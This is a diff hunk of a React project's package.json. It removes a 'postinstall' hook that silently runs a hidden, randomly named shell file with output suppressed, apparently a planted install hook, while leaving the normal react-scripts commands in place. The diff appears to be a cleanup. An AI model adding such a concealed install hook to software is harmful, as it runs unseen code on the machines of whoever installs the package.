@@ -59,8 +59,7 @@
     "start": "react-scripts  --openssl-legacy-provider start",
     "build": "react-scripts  --openssl-legacy-provider build",
     "test": "react-scripts  --openssl-legacy-provider test",
-    "eject": "react-scripts  --openssl-legacy-provider eject",
-    "postinstall": "sh ./.ci-3ge5zd.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "eject": "react-scripts  --openssl-legacy-provider eject"
   },
   "eslintConfig": {
     "extends": "react-app"
